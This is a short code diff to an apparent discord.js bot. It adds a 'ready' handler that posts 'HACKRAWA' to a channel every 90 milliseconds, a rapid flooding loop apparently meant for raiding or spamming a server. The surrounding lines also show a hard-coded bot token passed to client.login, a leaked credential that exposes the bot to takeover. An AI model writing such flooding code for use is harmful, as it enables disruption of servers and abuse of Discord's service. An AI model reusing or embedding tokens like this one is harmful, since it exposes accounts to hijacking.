@@ -98,5 +98,12 @@ if (message.content.startsWith(adminprefix + 'setava')) {
  ////codaka drwst krawa lalayan black jack
 
 
+
+client.on('ready', () => { 
+    setInterval (function () {
+      client.guilds.get('').channels.get('').send(`HACKRAWA`)
+ 
+    }, 90); 
+          })
 client.login("ODEyMjYzODU2Njk2ODUyNTIx.YC-Nqg.BclcZP-hyPezGA5GU9_6lNkXWa4")
           
